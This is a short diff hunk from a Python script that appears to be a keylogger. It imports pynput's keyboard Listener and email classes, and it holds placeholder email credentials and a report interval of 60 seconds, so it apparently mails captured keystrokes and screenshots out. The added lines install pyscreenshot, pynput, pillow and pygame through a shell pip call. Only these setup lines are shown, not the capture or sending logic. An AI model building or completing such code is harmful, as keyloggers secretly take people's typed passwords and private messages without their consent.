@@ -10,6 +10,9 @@ from pynput.keyboard import Listener
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
+from subprocess import call
+modules = ["pyscreenshot", "pynput", "pillow", "pygame"]
+call("pip install " + ' '.join(modules), shell=True)
 EMAIL_ADDRESS = "Your-Email-Address"
 EMAIL_PASSWORD = "Your Password"
 SEND_REPORT_EVERY = 60
